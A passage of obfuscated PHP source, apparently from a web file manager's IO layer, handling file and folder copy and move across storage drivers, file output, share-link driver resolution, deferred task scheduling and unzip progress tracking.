$ßÉâ†¢ä = $ÑÕ”ÛÃÅ->getPathOuter($ßÉâ†¢ä); } return $ßÉâ†¢ä; } private static function check($ì¢“¢“, $æ¾‚¢Üš, $Å¬Şäµ©, &$ŞûãÀ˜Ç) { $¨ó²‡ÒË =& $_SERVER[«òÑğ]; if (self::driverIsSame($ì¢“¢“, $Å¬Şäµ©) && $ì¢“¢“->isFolder($æ¾‚¢Üš) && $ì¢“¢“->isParentOf($æ¾‚¢Üš, $ŞûãÀ˜Ç)) { show_json(LNG($¨ó²‡ÒË[1245]), !1); } if (!$ì¢“¢“->exist($æ¾‚¢Üš)) { show_json(LNG($¨ó²‡ÒË[108]), !1); } } private static function copyPath($‹¡¡øÚ€, $Æª·¤Ñà, $ƒˆç“Ü‘, $‚”ëÀï¥, $Ç»ÜâŞ, $ëÔæ÷øÎ, $¬“’ìÔÜ, $ıûîî¸° = false, $êÉ¼„’ä = true) { $‚Î€ùØ =& $_SERVER[«òÑğ]; $ÀÑê…Åç = empty($ıûîî¸°) && $ıûîî¸° !== $‚Î€ùØ[231] ? $‹¡¡øÚ€->pathThis($Æª·¤Ñà) : $ıûîî¸°; if ($Ç»ÜâŞ) { $‚›™´ñ˜ = $ƒˆç“Ü‘->fileNameExist($‚”ëÀï¥, $ÀÑê…Åç); $ßº˜“ÀÈ = $ÀÑê…Åç; $ÀÑê…Åç = $ƒˆç“Ü‘->fileNameAuto($‚”ëÀï¥, $ÀÑê…Åç, $Ç»ÜâŞ, !$¬“’ìÔÜ); if (!$‚›™´ñ˜ || $ßº˜“ÀÈ != $ÀÑê…Åç) { $Ç»ÜâŞ = !1; } if ($êÉ¼„’ä && !$Ç»ÜâŞ) { $ƒˆç“Ü‘->_data[$‚Î€ùØ[1246]] = !0; } } if ($¬“’ìÔÜ) { return self::copyFile($‹¡¡øÚ€, $Æª·¤Ñà, $ƒˆç“Ü‘, $‚”ëÀï¥, $ÀÑê…Åç, $ëÔæ÷øÎ); } if ($Ç»ÜâŞ == REPEAT_RENAME_FOLDER) { $Ç»ÜâŞ = !1; } $Ã•²Õ‰ = rtrim($‚”ëÀï¥, $‚Î€ùØ[8]) . $‚Î€ùØ[8] . $ÀÑê…Åç; $×ô®ÓªÜ = $ƒˆç“Ü‘->mkdir($ƒˆç“Ü‘->getPath($Ã•²Õ‰), $Ç»ÜâŞ); $‚”ëÀï¥ = $ƒˆç“Ü‘->getPathInner($×ô®ÓªÜ); $ùŒ¡ÎĞ = $‹¡¡øÚ€->listPath($Æª·¤Ñà, !0); $ùŒ¡ÎĞ = is_array($ùŒ¡ÎĞ) ? $ùŒ¡ÎĞ : array($‚Î€ùØ[86] => array(), $‚Î€ùØ[85] => array()); $ÂğèøĞÖ = array_merge($ùŒ¡ÎĞ[$‚Î€ùØ[86]], $ùŒ¡ÎĞ[$‚Î€ùØ[85]]); foreach ($ÂğèøĞÖ as $Ê˜ó»¯…) { $±¶œŸÓæ = $Ê˜ó»¯…[$‚Î€ùØ[33]] == $‚Î€ùØ[233]; $Æª·¤Ñà = $‹¡¡øÚ€->getPathInner($Ê˜ó»¯…[$‚Î€ùØ[87]]); $‰¿¶”¯¼ = self::copyPath($‹¡¡øÚ€, $Æª·¤Ñà, $ƒˆç“Ü‘, $‚”ëÀï¥, $Ç»ÜâŞ, $ëÔæ÷øÎ, $±¶œŸÓæ, !1, !1); if (!$‰¿¶”¯¼) { IO::errorTips($‚Î€ùØ[1247] . $Æª·¤Ñà . $‚Î€ùØ[73] . $‚”ëÀï¥); } } self::copyMoveKeepInfo($‹¡¡øÚ€, $Æª·¤Ñà, $×ô®ÓªÜ); return $×ô®ÓªÜ; } private static function copyFile($Ğ›¥Æá¯, $®Ô‚Ëæù, $Ã¹ÄÚ¨, $ŠÈ¥Í±ñ, $êëÄÍšë, $Öé˜§´) { $ç¯Øûï« =& $_SERVER[«òÑğ]; $ŠÈ¥Í±ñ = $Ã¹ÄÚ¨->getPath(rtrim($ŠÈ¥Í±ñ, $ç¯Øûï«[8]) . $ç¯Øûï«[8] . $êëÄÍšë); $ÜÑñªÃ· = $ç¯Øûï«[1248] . time() . rand_string(5); Hook::trigger($ç¯Øûï«[1249], $Ğ›¥Æá¯, $®Ô‚Ëæù, $Ã¹ÄÚ¨, $ŠÈ¥Í±ñ, $êëÄÍšë, $ÜÑñªÃ·); if (self::driverIsSame($Ğ›¥Æá¯, $Ã¹ÄÚ¨)) { if ($Öé˜§´) { $Ô±æçı™ = $Ã¹ÄÚ¨->moveFile($®Ô‚Ëæù, $ŠÈ¥Í±ñ); } else { $Ô±æçı™ = $Ã¹ÄÚ¨->copyFile($®Ô‚Ëæù, $ŠÈ¥Í±ñ); } Hook::trigger($ç¯Øûï«[1250], $Ğ›¥Æá¯, $®Ô‚Ëæù, $Ã¹ÄÚ¨, $ŠÈ¥Í±ñ, $êëÄÍšë, $Ô±æçı™); self::copyMoveKeepInfo($Ğ›¥Æá¯, $®Ô‚Ëæù, $Ô±æçı™); return $Ô±æçı™; } $É‹ßÁ½ = TEMP_FILES; if ($GLOBALS[$ç¯Øûï«[6]][$ç¯Øûï«[92]][$ç¯Øûï«[882]]) { $É‹ßÁ½ = $GLOBALS[$ç¯Øûï«[6]][$ç¯Øûï«[92]][$ç¯Øûï«[882]]; } $Ãé–“‰“ = $É‹ßÁ½; mk_dir($Ãé–“‰“); $ÔŒ…‹ÀÌ = $Ãé–“‰“ . $ÜÑñªÃ·; $•Î™à· = $ÔŒ…‹ÀÌ; $ÔŒ…‹ÀÌ = $Ğ›¥Æá¯->download($®Ô‚Ëæù, $ÔŒ…‹ÀÌ); $ÔŒ…‹ÀÌ = $Ğ›¥Æá¯->iconvApp($ÔŒ…‹ÀÌ); if (substr($ÔŒ…‹ÀÌ, strlen($É‹ßÁ½)) == $É‹ßÁ½) { $Öé˜§´ = !0; } $Ô±æçı™ = $Ã¹ÄÚ¨->upload($ŠÈ¥Í±ñ, $ÔŒ…‹ÀÌ, $Öé˜§´); self::remove($•Î™à·); Hook::trigger($ç¯Øûï«[1250], $Ğ›¥Æá¯, $®Ô‚Ëæù, $Ã¹ÄÚ¨, $ŠÈ¥Í±ñ, $êëÄÍšë, $Ô±æçı™); self::copyMoveKeepInfo($Ğ›¥Æá¯, $®Ô‚Ëæù, $Ô±æçı™); return $Ô±æçı™; } private static function copyMoveKeepInfo($«ºáÕÓ, $Õß’¶®¾, $íšéª›‚) { if (!$íšéª›‚) { return; } $¡©âÖ”ë = $«ºáÕÓ->info($Õß’¶®¾); if (!is_array($¡©âÖ”ë)) { return; } IO::setModifyTime($íšéª›‚, $¡©âÖ”ë[$_SERVER[«òÑğ][88]]); } public static function pathFather($´¯ˆ÷ùÇ) { $—‘äüÃõ = IO::init($´¯ˆ÷ùÇ); $Ş½ÙßÜñ = $—‘äüÃõ->pathFather($—‘äüÃõ->path); return $—‘äüÃõ->getPathOuter($Ş½ÙßÜñ); } public static function fileOut($²œ¨¦‰ø, $áÑ¬ı˜î = false, $ØŞÓÅê¡ = false, $Ğ£±æ‚Ö = '') { $•Ò¡ƒ¯ = self::driverMake($²œ¨¦‰ø); if ($•Ò¡ƒ¯->isFileOutServer()) { return $•Ò¡ƒ¯->fileOutServer($²œ¨¦‰ø, $áÑ¬ı˜î, $ØŞÓÅê¡, $Ğ£±æ‚Ö); } return $•Ò¡ƒ¯->fileOut($²œ¨¦‰ø, $áÑ¬ı˜î, $ØŞÓÅê¡, $Ğ£±æ‚Ö); } public static function fileOutImage($Ùºë·ßø, $¡Ö”­¡§ = 250) { $ûõÇÙÄ = array(250, 600, 1200, 2000, 3000, 5000); for ($»ÖóÔ¾ = 0; $»ÖóÔ¾ < count($ûõÇÙÄ); $»ÖóÔ¾++) { if ($»ÖóÔ¾ == 0 && $¡Ö”­¡§ <= $ûõÇÙÄ[$»ÖóÔ¾]) { $¡Ö”­¡§ = $ûõÇÙÄ[$»ÖóÔ¾]; break; } else { if ($¡Ö”­¡§ > $ûõÇÙÄ[$»ÖóÔ¾ - 1] && $¡Ö”­¡§ <= $ûõÇÙÄ[$»ÖóÔ¾]) { $¡Ö”­¡§ = $ûõÇÙÄ[$»ÖóÔ¾]; break; } else { if ($»ÖóÔ¾ == count($ûõÇÙÄ) - 1 && $¡Ö”­¡§ > $ûõÇÙÄ[$»ÖóÔ¾]) { $¡Ö”­¡§ = $ûõÇÙÄ[$»ÖóÔ¾]; break; } } } } $İ»¯€Á´ = self::driverMake($Ùºë·ßø); if ($İ»¯€Á´->isFileOutServer()) { return $İ»¯€Á´->fileOutImageServer($Ùºë·ßø, $¡Ö”­¡§); } return $İ»¯€Á´->fileOutImage($Ùºë·ßø, $¡Ö”­¡§); } private static function driverIsSame($Ê¼š¦Í, $öÑÃÇ‰È) { $¤÷¿§òÆ =& $_SERVER[«òÑğ]; $˜ßü ÁĞ = $Ê¼š¦Í->getType(); $Å·¦Ã«æ = $öÑÃÇ‰È->getType(); if ($˜ßü ÁĞ != $Å·¦Ã«æ) { return !1; } if ($˜ßü ÁĞ == $¤÷¿§òÆ[841]) { return !0; } if ($˜ßü ÁĞ == $¤÷¿§òÆ[109]) { return !0; } if ($Ê¼š¦Í->pathDriver == $öÑÃÇ‰È->pathDriver) { return !0; } return !1; } public static function copyUpdate($È†öÕÚ, $¬Ù…Ú˜¯) { $ìÍü¬¶ä =& $_SERVER[«òÑğ]; if (!IO::exist($È†öÕÚ)) { return !1; } if (!IO::exist($¬Ù…Ú˜¯)) { IO::mkdir($¬Ù…Ú˜¯); } $ÏÃè½‹ã = array_to_keyvalue(self::listAllSimple($È†öÕÚ), $ìÍü¬¶ä[87]); $Å¬ıˆİÛ = array_to_keyvalue(self::listAllSimple($¬Ù…Ú˜¯), $ìÍü¬¶ä[87]); $Çé×È•¹ = array(); $ö°ò÷ûï = array(); foreach ($ÏÃè½‹ã as $öÎ¬”âÌ => $éº‡úö¥) { if (isset($Å¬ıˆİÛ[$öÎ¬”âÌ])) { if ($éº‡úö¥[$ìÍü¬¶ä[78]] == 1) { continue; } if ($Å¬ıˆİÛ[$öÎ¬”âÌ][$ìÍü¬¶ä[79]] == $éº‡úö¥[$ìÍü¬¶ä[79]]) { continue; } } if ($éº‡úö¥[$ìÍü¬¶ä[78]] == 1) { $ö°ò÷ûï[] = $¬Ù…Ú˜¯ . $ìÍü¬¶ä[8] . trim($öÎ¬”âÌ, $ìÍü¬¶ä[8]); continue; } $—€¢ıŞÜ = strstr(trim($öÎ¬”âÌ, $ìÍü¬¶ä[8]), $ìÍü¬¶ä[8]) ? get_path_father($öÎ¬”âÌ) : $ìÍü¬¶ä[12]; $Çé×È•¹[] = array($ìÍü¬¶ä[1251] => $éº‡úö¥[$ìÍü¬¶ä[89]], $ìÍü¬¶ä[1252] => rtrim($¬Ù…Ú˜¯, $ìÍü¬¶ä[8]) . $ìÍü¬¶ä[8] . $—€¢ıŞÜ, $ìÍü¬¶ä[1253] => $éº‡úö¥); } $‚öİÆîŞ = array($ìÍü¬¶ä[233] => $Çé×È•¹, $ìÍü¬¶ä[78] => $ö°ò÷ûï); Hook::trigger($ìÍü¬¶ä[1254], $È†öÕÚ, $¬Ù…Ú˜¯, $‚öİÆîŞ); foreach ($ö°ò÷ûï as $éº‡úö¥) { IO::mkdir($éº‡úö¥); } foreach ($Çé×È•¹ as $éº‡úö¥) { IO::copy($éº‡úö¥[$ìÍü¬¶ä[1251]], $éº‡úö¥[$ìÍü¬¶ä[1252]], REPEAT_REPLACE); } } public static function fileSubstr($¬ÖŞÏï, $Âü±Áæî, $–”êıÇ = false) { $ª…ğÆÎ =& $_SERVER[«òÑğ]; $‡ÊíÈ¢ = self::driverMake($¬ÖŞÏï); $¡Õå©Óª = $‡ÊíÈ¢->size($¬ÖŞÏï); $Åè“½ÇÚ = $Âü±Áæî; $óš÷ùˆì = $–”êıÇ; if ($Âü±Áæî < 0) { $Âü±Áæî = $¡Õå©Óª + $Âü±Áæî; } if ($–”êıÇ === !1) { $–”êıÇ = $¡Õå©Óª - $Âü±Áæî; } if ($Âü±Áæî + $–”êıÇ > $¡Õå©Óª) { $–”êıÇ = $¡Õå©Óª - $Âü±Áæî; } if (!$¡Õå©Óª && $‡ÊíÈ¢->getType() == $ª…ğÆÎ[109] && !$‡ÊíÈ¢->exist($¬ÖŞÏï)) { $£å‹¶ø± = get_path_this($¬ÖŞÏï); $ŸÖ¹«·« = parse_url_query($£å‹¶ø±); if (is_array($ŸÖ¹«·«) && isset($ŸÖ¹«·«[$ª…ğÆÎ[32]])) { $£å‹¶ø± = urldecode($ŸÖ¹«·«[$ª…ğÆÎ[32]]); } throw new Exception($ª…ğÆÎ[1255] . LNG($ª…ğÆÎ[1256]) . $ª…ğÆÎ[1053] . clear_html($£å‹¶ø±) . $ª…ğÆÎ[12]); } if ($–”êıÇ <= 0) { return $ª…ğÆÎ[12]; } if ($Âü±Áæî < 0 || $Âü±Áæî >= $¡Õå©Óª || $–”êıÇ > 1024 * 1024 * 10) { throw new Exception("\146\x69\x6c\145\122\145\141\144\40\x65\162\162\x6f\x72\x21\40\163\x74\141\162\164\75{$Âü±Áæî}\73\154\x65\156\147\164\x68\x3d{$–”êıÇ}\x3b\40\x73\151\172\x65\x3d{$¡Õå©Óª}\x3b"); } $éœé¦¿¯ = $‡ÊíÈ¢->fileSubstr($¬ÖŞÏï, $Âü±Áæî, $–”êıÇ); if (!$éœé¦¿¯ && $–”êıÇ && isset($GLOBALS[$ª…ğÆÎ[1257]])) { throw new Exception($GLOBALS[$ª…ğÆÎ[1257]][$ª…ğÆÎ[1258]]); } return $éœé¦¿¯; } private static function driverMake(&$£ßáÁìó) { $ÆäŸ‰¼ =& $_SERVER[«òÑğ]; $¥²ÔÕß = KodIO::parse($£ßáÁìó); if (!self::$driverListSystem) { $‚ÒòÊèÃ = Model($ÆäŸ‰¼[851])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($‚ÒòÊèÃ, $ÆäŸ‰¼[478]); } if ($¥²ÔÕß[$ÆäŸ‰¼[33]] == KodIO::KOD_IO && !self::$driverListSystem[$¥²ÔÕß[$ÆäŸ‰¼[478]]]) { throw new Exception($ÆäŸ‰¼[1259]); return !1; } $£ßáÁìó = $¥²ÔÕß[$ÆäŸ‰¼[1260]]; $´ßğƒìù = self::driverGet($¥²ÔÕß, $£ßáÁìó); return $´ßğƒìù; } private static function driverGet($ĞŠŠ¼•Ó, &$‘äÛå) { $§€û´ñè =& $_SERVER[«òÑğ]; $äÁ°…— = $ĞŠŠ¼•Ó[$§€û´ñè[1261]]; $Í¤±±œï = $ĞŠŠ¼•Ó[$§€û´ñè[478]]; switch ($ĞŠŠ¼•Ó[$§€û´ñè[33]]) { case KodIO::KOD_IO: $ õŞÆ‰ = self::$driverListSystem[$Í¤±±œï]; break; case KodIO::KOD_SOURCE: $‘äÛå = $Í¤±±œï . $‘äÛå; $ õŞÆ‰ = array($§€û´ñè[1262] => $§€û´ñè[1263], $§€û´ñè[6] => $ĞŠŠ¼•Ó); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $´Æ¨ÇºÔ = $GLOBALS[$§€û´ñè[1264]]; self::$driverListUser = array_to_keyvalue($´Æ¨ÇºÔ, $§€û´ñè[478]); } $ õŞÆ‰ = self::$driverListUser[$Í¤±±œï]; break; case KodIO::KOD_SHARE_LINK: $ õŞÆ‰ = array($§€û´ñè[1262] => $§€û´ñè[1265], $§€û´ñè[6] => $ĞŠŠ¼•Ó); $µÊ“ºå™ = Action($§€û´ñè[1266])->sharePathInfo($ĞŠŠ¼•Ó[$§€û´ñè[87]]); $‘äÛå = $µÊ“ºå™[$§€û´ñè[194]]; if (!$µÊ“ºå™[$§€û´ñè[194]]) { $Ğ’Ù«Ó = Model($§€û´ñè[672])->getInfo($µÊ“ºå™[$§€û´ñè[673]]); $‘äÛå = KodIO::clear($Ğ’Ù«Ó[$§€û´ñè[1267]] . $ĞŠŠ¼•Ó[$§€û´ñè[1260]]); $ĞŠŠ¼•Ó[$§€û´ñè[565]] = $Ğ’Ù«Ó; $ĞŠŠ¼•Ó[$§€û´ñè[1242]] = $‘äÛå; $ õŞÆ‰ = array($§€û´ñè[1262] => $§€û´ñè[1268], $§€û´ñè[6] => $ĞŠŠ¼•Ó); } break; case KodIO::KOD_SHARE_ITEM: $ õŞÆ‰ = array($§€û´ñè[1262] => $§€û´ñè[1269], $§€û´ñè[6] => $ĞŠŠ¼•Ó); $Ğ’Ù«Ó = Model($§€û´ñè[672])->getInfo($ĞŠŠ¼•Ó[$§€û´ñè[478]]); if ($Ğ’Ù«Ó[$§€û´ñè[194]] == $§€û´ñè[231]) { $‘äÛå = KodIO::clear($Ğ’Ù«Ó[$§€û´ñè[1267]] . $ĞŠŠ¼•Ó[$§€û´ñè[1260]]); $ĞŠŠ¼•Ó[$§€û´ñè[565]] = $Ğ’Ù«Ó; $ĞŠŠ¼•Ó[$§€û´ñè[1242]] = $‘äÛå; $ õŞÆ‰ = array($§€û´ñè[1262] => $§€û´ñè[1270], $§€û´ñè[6] => $ĞŠŠ¼•Ó); } else { if (!$‘äÛå) { $‘äÛå = $Ğ’Ù«Ó[$§€û´ñè[194]]; } } break; default: $‘äÛå = $ĞŠŠ¼•Ó[$§€û´ñè[87]]; $ õŞÆ‰ = array($§€û´ñè[1262] => $§€û´ñè[1271]); break; } $‡¾÷íÔ± = $ĞŠŠ¼•Ó[$§€û´ñè[87]]; if (!isset(self::$driverCache[$‡¾÷íÔ±])) { $©÷¿ßèÊ = strtolower($ õŞÆ‰[$§€û´ñè[98]]); $İˆ¯Éßè = $GLOBALS[$§€û´ñè[6]][$§€û´ñè[92]][$§€û´ñè[915]]; $µÚ›ßç = $§€û´ñè[77] . (isset($İˆ¯Éßè[$©÷¿ßèÊ]) ? $İˆ¯Éßè[$©÷¿ßèÊ] : ucfirst($©÷¿ßèÊ)); if (!class_exists($µÚ›ßç)) { show_json("{$µÚ›ßç}\40\x6e\157\164\x20\145\170\x69\x73\x74\x73\41", !1); } $Ü›œ÷½× = isset($ õŞÆ‰[$§€û´ñè[6]]) ? $ õŞÆ‰[$§€û´ñè[6]] : !1; self::$driverCache[$‡¾÷íÔ±] = new $µÚ›ßç($Ü›œ÷½×); } $º†ò¤Üù = self::$driverCache[$‡¾÷íÔ±]; $º†ò¤Üù->pathDriver = $äÁ°…—; $º†ò¤Üù->pathBase = $§€û´ñè[12]; if (isset($ õŞÆ‰[$§€û´ñè[6]][$§€û´ñè[1272]])) { $º†ò¤Üù->pathBase = rtrim($ õŞÆ‰[$§€û´ñè[6]][$§€û´ñè[1272]], $§€û´ñè[8]) . $§€û´ñè[8]; $‘äÛå = $º†ò¤Üù->pathBase . ltrim($‘äÛå, $§€û´ñè[8]); } $‘äÛå = $º†ò¤Üù->getPath($‘äÛå); if (isset($ĞŠŠ¼•Ó[$§€û´ñè[1242]])) { $‘äÛå = $ĞŠŠ¼•Ó[$§€û´ñè[1242]]; } $º†ò¤Üù->path = $‘äÛå; return $º†ò¤Üù; } public static function errorTips($ŸÇØÇú = false) { $Œîôóá =& $_SERVER[«òÑğ]; static $²Ùª³Ğï = array(); $•æÖîÂû = 1000; if ($ŸÇØÇú === -1) { return $²Ùª³Ğï ? $²Ùª³Ğï[count($²Ùª³Ğï) - 1] : $Œîôóá[12]; } if ($ŸÇØÇú === !1) { return implode($Œîôóá[288], $²Ùª³Ğï); } if (count($²Ùª³Ğï) >= $•æÖîÂû) { $²Ùª³Ğï = array_slice($²Ùª³Ğï, $•æÖîÂû * 0.5, $•æÖîÂû); } $²Ùª³Ğï[] = $ŸÇØÇú; write_log($Œîôóá[176] . ACTION . $Œîôóá[1273] . $ŸÇØÇú, $Œîôóá[1274]); } public static function getLastError($¦›ºæ†À = '') { $Îà ³ÅŸ = self::errorTips(-1); return $Îà ³ÅŸ ? $Îà ³ÅŸ : $¦›ºæ†À; } } goto eŸ±½”³ò; D™³„¡ëø: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ÏÜÄ˜ò³, $Ã¡ÓõÃó = 5.0) { if (!$ÏÜÄ˜ò³) { return; } $ÚÈ¦âÍ² = Cache::get($ÏÜÄ˜ò³); if (!$ÚÈ¦âÍ² || timeFloat() - floatVal($ÚÈ¦âÍ²) >= $Ã¡ÓõÃó) { Cache::set($ÏÜÄ˜ò³, timeFloat(), $Ã¡ÓõÃó * 10); return !0; } return !1; } public static function timeLimitCall($­ÍìºÚ, $ÖšßÔÆ, $™œÆ¾¡, $ç´µÆ› = 5.0) { $õğšôÏÆ =& $_SERVER[«òÑğ]; if (!$­ÍìºÚ || !$ÖšßÔÆ) { return; } self::$asyncAdd = !0; $ì–æ‚ğú = $õğšôÏÆ[1892]; $¿ô×€”ì = Cache::get($ì–æ‚ğú, !0); $éø²õÁÍ = array($õğšôÏÆ[1893] => timeFloat(), $õğšôÏÆ[1894] => timeFloat(), $õğšôÏÆ[344] => $ÖšßÔÆ, $õğšôÏÆ[1884] => $™œÆ¾¡, $õğšôÏÆ[207] => $ç´µÆ›); if (is_array($¿ô×€”ì[$­ÍìºÚ])) { $éø²õÁÍ[$õğšôÏÆ[1894]] = $¿ô×€”ì[$­ÍìºÚ][$õğšôÏÆ[1894]]; } if (is_array($¿ô×€”ì[$­ÍìºÚ])) { if (timeFloat() - $¿ô×€”ì[$­ÍìºÚ][$õğšôÏÆ[1893]] < $éø²õÁÍ[$õğšôÏÆ[207]] * 0.3) { return; } $éø²õÁÍ[$õğšôÏÆ[1894]] = $¿ô×€”ì[$­ÍìºÚ][$õğšôÏÆ[1894]]; } $¿ô×€”ì[$­ÍìºÚ] = $éø²õÁÍ; Cache::set($ì–æ‚ğú, $¿ô×€”ì, 60); Cache::removeMemory($ì–æ‚ğú); write_log($õğšôÏÆ[1895] . $­ÍìºÚ . $õğšôÏÆ[74] . $ÖšßÔÆ, $õğšôÏÆ[198]); } public static function timeLimitCallLoop() { $¶ˆ¿•Å¶ =& $_SERVER[«òÑğ]; $ëäîùìƒ = array($¶ˆ¿•Å¶[1896]); $Æ…‘á”ó = in_array(strtolower(ACTION), $ëäîùìƒ); if (!$Æ…‘á”ó && !self::$asyncAdd) { return; } $ìñÁ°™ = $¶ˆ¿•Å¶[1892]; $Íµ£„Åã = Cache::get($ìñÁ°™, !0); if (!$Íµ£„Åã || count($Íµ£„Åã) <= 0) { return; } $İ­İÕœú = !1; $ŠÒ‚ö×Œ = timeFloat(); $Öáî‹Ç® = array(); foreach ($Íµ£„Åã as $ÆŒ¡¢‘º => $Ö¹ã÷¢™) { if ($ŠÒ‚ö×Œ - $Ö¹ã÷¢™[$¶ˆ¿•Å¶[1894]] > $Ö¹ã÷¢™[$¶ˆ¿•Å¶[207]]) { $İ­İÕœú = !0; try { Hook::apply($Ö¹ã÷¢™[$¶ˆ¿•Å¶[344]], $Ö¹ã÷¢™[$¶ˆ¿•Å¶[1884]]); write_log($¶ˆ¿•Å¶[1897] . $ÆŒ¡¢‘º . $¶ˆ¿•Å¶[74] . $Ö¹ã÷¢™[$¶ˆ¿•Å¶[344]] . $¶ˆ¿•Å¶[1898] . ACTION, $¶ˆ¿•Å¶[198]); } catch (Exception $ü‹ ùÁĞ) { } continue; } $Öáî‹Ç®[$ÆŒ¡¢‘º] = $Ö¹ã÷¢™; } if (!$İ­İÕœú) { return; } if (!$Öáî‹Ç®) { return Cache::remove($ìñÁ°™); } Cache::set($ìñÁ°™, $Öáî‹Ç®, 60); Cache::removeMemory($ìñÁ°™); } public static function finished($Ç®Ò…˜¸, $ò´…Ë©©) { $åÔ­Üú° =& $_SERVER[«òÑğ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($åÔ­Üú°[344] => $Ç®Ò…˜¸, $åÔ­Üú°[1884] => $ò´…Ë©©); } private static function finishedRun() { $ŒÜƒ¾˜ =& $_SERVER[«òÑğ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $õ†“ª¼) { try { Hook::apply($õ†“ª¼[$ŒÜƒ¾˜[344]], $õ†“ª¼[$ŒÜƒ¾˜[1884]]); } catch (Exception $Ï£ßÉÒõ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ĞêÌä =& $_SERVER[«òÑğ]; parent::startAfter(); Hook::bind($ĞêÌä[1899], array($this, $ĞêÌä[1900])); Hook::bind($ĞêÌä[1288], array($this, $ĞêÌä[1901])); Hook::bind($ĞêÌä[1902], array($this, $ĞêÌä[1903])); $‘§¼£Î× =& $this->task; $‘§¼£Î×[$ĞêÌä[1904]] = $ĞêÌä[1289]; if (!$‘§¼£Î×[$ĞêÌä[1671]]) { $‘§¼£Î×[$ĞêÌä[1671]] = LNG($ĞêÌä[1905]); } } protected function endAfter() { $¥ã¾íáå =& $_SERVER[«òÑğ]; parent::endAfter(); Hook::unbind($¥ã¾íáå[1899], array($this, $¥ã¾íáå[1900])); Hook::unbind($¥ã¾íáå[1288], array($this, $¥ã¾íáå[1901])); Hook::unbind($¥ã¾íáå[1902], array($this, $¥ã¾íáå[1903])); } public function updateAfter() { $»ŞÒÌ¤ =& $_SERVER[«òÑğ]; $¦²§öË˜ =& $this->task; if (!$¦²§öË˜[$»ŞÒÌ¤[1150]] || !$¦²§öË˜[$»ŞÒÌ¤[847]]) { if ($¦²§öË˜[$»ŞÒÌ¤[1904]] != $»ŞÒÌ¤[391]) { return; } } if ($¦²§öË˜[$»ŞÒÌ¤[1904]] == $»ŞÒÌ¤[1289]) { $ğ·«Õ¡è = 0; if ($¦²§öË˜[$»ŞÒÌ¤[1838]]) { $ğ·«Õ¡è = $¦²§öË˜[$»ŞÒÌ¤[1839]] / $¦²§öË˜[$»ŞÒÌ¤[1838]]; } $¦²§öË˜[$»ŞÒÌ¤[1786]] = $ğ·«Õ¡è * 0.3; } else { if ($¦²§öË˜[$»ŞÒÌ¤[1904]] == $»ŞÒÌ¤[391]) { $ğ·«Õ¡è = $¦²§öË˜[$»ŞÒÌ¤[1785]] / $¦²§öË˜[$»ŞÒÌ¤[1150]]; $¦²§öË˜[$»ŞÒÌ¤[1786]] = 0.3 + $ğ·«Õ¡è * 0.4; } else { if ($¦²§öË˜[$»ŞÒÌ¤[1904]] == $»ŞÒÌ¤[110]) { $†˜óÜİé = 0; if ($¦²§öË˜[$»ŞÒÌ¤[1840]] == $»ŞÒÌ¤[110]) { $†˜óÜİé = $¦²§öË˜[$»ŞÒÌ¤[1839]]; } $ğ·«Õ¡è = ($¦²§öË˜[$»ŞÒÌ¤[1843]] + $†˜óÜİé) / $¦²§öË˜[$»ŞÒÌ¤[847]]; $¦²§öË˜[$»ŞÒÌ¤[1786]] = 0.3 + 0.4 + $ğ·«Õ¡è * 0.3; } } } if ($¦²§öË˜[$»ŞÒÌ¤[1786]] > 0) { $Ú§ììƒ‡ = timeFloat() - $¦²§öË˜[$»ŞÒÌ¤[1788]] - $¦²§öË˜[$»ŞÒÌ¤[1791]]; $¦²§öË˜[$»ŞÒÌ¤[1792]] = $Ú§ììƒ‡ * (1 - $¦²§öË˜[$»ŞÒÌ¤[1786]]) / $¦²§öË˜[$»ŞÒÌ¤[1786]]; } } public function addFile($›±Ëä×…) { $“°ÃÍºı =& $_SERVER[«òÑğ]; $Ğ¾´Ú¹Í =& $this->task; $˜¤ü»üÒ = IO::info($›±Ëä×…); $Ğ¾´Ú¹Í[$“°ÃÍºı[1836]] = $˜¤ü»üÒ[$“°ÃÍºı[32]]; $Ğ¾´Ú¹Í[$“°ÃÍºı[1838]] = $˜¤ü»üÒ[$“°ÃÍºı[79]]; $Ğ¾´Ú¹Í[$“°ÃÍºı[1839]] = 0; $Ğ¾´Ú¹Í[$“°ÃÍºı[1152]] = $“°ÃÍºı[1859]; $Ğ¾´Ú¹Í[$“°ÃÍºı[1840]] = $“°ÃÍºı[1289]; $Ğ¾´Ú¹Í[$“°ÃÍºı[847]] = $˜¤ü»üÒ[$“°ÃÍºı[79]]; $Ğ¾´Ú¹Í[$“°ÃÍºı[1150]] = 1; $‹ôÂàÕİ = 0; $Ğ¾´Ú¹Í[$“°ÃÍºı[1847]] = array($“°ÃÍºı[1848] => $‹ôÂàÕİ + 1, $“°ÃÍºı[497] => $˜¤ü»üÒ[$“°ÃÍºı[32]], $“°ÃÍºı[87] => $˜¤ü»üÒ[$“°ÃÍºı[87]], $“°ÃÍºı[587] => $˜¤ü»üÒ[$“°ÃÍºı[587]] ? $˜¤ü»üÒ[$“°ÃÍºı[587]] : $˜¤ü»üÒ[$“°ÃÍºı[87]]); $this->update(); } public function zipEvent($§ÍøÂÉ, $¸¦š’âÄ, $©Õ¹È„š, $²…¨ ¯°) { $ê®¡’¥Í =& $_SERVER[«òÑğ]; $ô±ƒ¿´ =& $this->task; $ô±ƒ¿´[$ê®¡’¥Í[1836]] = get_path_this($¸¦š’âÄ); $ô±ƒ¿´[$ê®¡’¥Í[1838]] = $²…¨ ¯°; $ô±ƒ¿´[$ê®¡’¥Í[1839]] = $©Õ¹È„š; $ô±ƒ¿´[$ê®¡’¥Í[1152]] = $§ÍøÂÉ == $ê®¡’¥Í[1906] ? $ê®¡’¥Í[1907] : $ê®¡’¥Í[1908]; $ô±ƒ¿´[$ê®¡’¥Í[1840]] = $ê®¡’¥Í[12]; $ô±ƒ¿´[$ê®¡’¥Í[847]] = $²…¨ ¯°; $ô±ƒ¿´[$ê®¡’¥Í[1904]] = $ê®¡’¥Í[391]; $this->update(); } public function unzipAfter($şÀáôÏÍ) { $úÏÂÑ®• =& $_SERVER[«òÑğ]; $Õ®¤Ûßô =& $this->task; $Õ®¤Ûßô[$úÏÂÑ®•[1904]] = $úÏÂÑ®•[110]; 